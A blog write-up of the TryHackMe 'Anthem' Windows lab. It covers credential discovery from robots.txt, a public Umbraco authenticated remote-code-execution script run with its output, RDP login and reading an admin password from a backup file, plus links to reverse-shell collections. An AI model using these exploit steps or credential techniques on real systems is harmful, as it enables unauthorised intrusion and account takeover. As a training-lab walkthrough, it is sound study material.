---
image: "/assets/img/posts/Copie-de-Manager-1_790f4cc743.png"
title: "Anthem Tryhackme"
description: "Anthem on TryHackMe is an easy Windows machine for beginners. L"
pubDate: "2024-04-27"
author: "MrR0807"
categories: ["CTF"]
tags: ["cybersecurity", "writeup"]
pin: false
---
[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata).[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1).


## Reconnaissance





With a quick scan of nmap, I found these 2 ports which are open





  `








```bash


└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip


Scanning 10.10.26.182 [65535 ports]


Discovered open port 3389/tcp on 10.10.26.182


Discovered open port 80/tcp on 10.10.26.182





```


`RDP open on 3389A website Available on port 80





In the website I find the file /robots.txt which contains a password UmbracoIsTheBest!, So now, you have to find a user for this password





In the Blog I find a poem with the following words: `








```bash


Born on a Monday,


Christened on Tuesday,


Married on Wednesday,


Took ill on Thursday,


Grew worse on Friday,


Died on Saturday,


Buried on Sunday.


That was the end…





```


`





I copy this text and I do a search on Google, then I find that the user who made the poem is called Solomon Grundy by referring to the email which is in the [We are Hiring](http://10.10.74.33/archive/we-are-hiring/) which is: JD@anthem.com, that is to say that it is the email of Jane Doe, so the same case here is to take the first letter of the user Solomon Grundy and it will be SG@anthem.com and access with the password UmbracoIsTheBest! that I had already found





### Lacces Initial





Ok, Now, I have administrator access to the CMS.





> Whenever I find a CMS, I always start by checking Google for exploits





So while doing some research I found an Exploit on Github [Umbraco-RCE) Remote Code Execution](https://github.com/noraj/Umbraco-RCE) [![exploit](/assets/img/posts/exploit_199bd53a8b.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26) The exploit works, so I will list the files available with powershell and the ls command





  `








```bash


└─# python3 umbraco.py -u SG@anthem.com -p UmbracoIsTheBest! -i http://10.10.74.33/ -c powershell.exe -a ls





    Directory: C:\windows\system32\inetsrv





Mode                LastWriteTime         Length Name                                                                  


----                -------------         ------ ----                                                                  


d-----       05/04/2020     21:51                Config                                                                


d-----       05/04/2020     21:51                de-DE                                                                 


d-----       05/04/2020     11:27                en                                                                    


d-----       05/04/2020     11:27                en-US                                                                 


d-----       05/04/2020     21:51                es-ES                                                                 


d-----       05/04/2020     21:51                fr-FR                                                                 


d-----       05/04/2020     21:51                it-IT                                                                 


d-----       05/04/2020     21:51                ja-JP                                                                 


d-----       05/04/2020     21:51                ko-KR                                                                 


d-----       05/04/2020     21:51                ru-RU                                                                 


d-----       05/04/2020     21:51                zh-CN                                                                 


d-----       05/04/2020     21:51                zh-TW                                                                 


-a----       05/04/2020     11:27         119808 appcmd.exe                                                            


-a----       15/09/2018     08:14           3810 appcmd.xml                                                            


-a----       05/04/2020     11:27         181760 AppHostNavigators.dll                                                 


-a----       05/04/2020     11:26          80896 apphostsvc.dll                                                        


-a----       05/04/2020     11:27         406016 appobj.dll                                                            


-a----       05/04/2020     11:26         131072 aspnetca.exe                                                          


-a----       05/04/2020     11:27          40448 authanon.dll                                                          


-a----       05/04/2020     11:26          24064 cachfile.dll





```


`





From here we can create a shell in .ps1, then put it on the machine and have a Shell. But also as the RDP is already open, then I will see which users are available





  `








```bash


└─# xfreerdp /v:10.10.77.208 /u:SG /p:UmbracoIsTheBest! /sec:tls


[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - Certificate verification failure self-signed certificate (18) at stack position 0


[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - CN = WIN-LU09299160F


[01:11:19:471] [31485:31486] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32


[01:11:19:472] [31485:31486] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32





```


`





[![user.txt](/assets/img/posts/a1_1b87c159ee.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26) I find the user flag in the THM Desktop{NOOT_NOOT}





## Privilege Escalation





Now, ends with the user, we must therefore elevate our privileges and be root on the Machine. In the room, I am given a hint about the admin password saying its hidden. So I will display all the cached files on the machine





[![Hidden Files](/assets/img/posts/a2_58c38dea2b.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





Going back to my C:\ I find a new Folder called backup and a restore file. [![backup](/assets/img/posts/a3_c882dbc7a0.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





I did not have the necessary permissions to open this file, so I was able to modify it in the properties and Next, I display the contents:





[![Admin Pass](/assets/img/posts/a4_c0ccde8915.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





I use the password administrator to connect to the cmd and it works:





[![Rooted](/assets/img/posts/a5_d249e35c44.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26)





## Ressources supplementaires





Here are some additional resources that might be helpful to you:





[Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](https://www.exploit-db.com/exploits/46153)[Nishang PowerShells](https://github.com/samratashok/nishang/tree/master/Shells)[Join Us on Discord](https://discord.gg/wBT9wr9ruG). Share        [](https://twitter.com/intent/tweet?text=Anthem%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fanthem-tryhackme%2F)       [](https://www.facebook.com/sharer/sharer.php?title=Anthem%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE&u=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fanthem-tryhackme%2F)       [](https://t.me/share/url?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fanthem-tryhackme%2F&text=Anthem%20-%20TryHackMe%20-%20%E1%97%A9%E1%97%B7%E1%97%AAO%E1%91%8C%E1%92%AA%E1%97%A9YE)       [](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2F0xMrR0807.github.io%2Fposts%2Fanthem-tryhackme%2F)


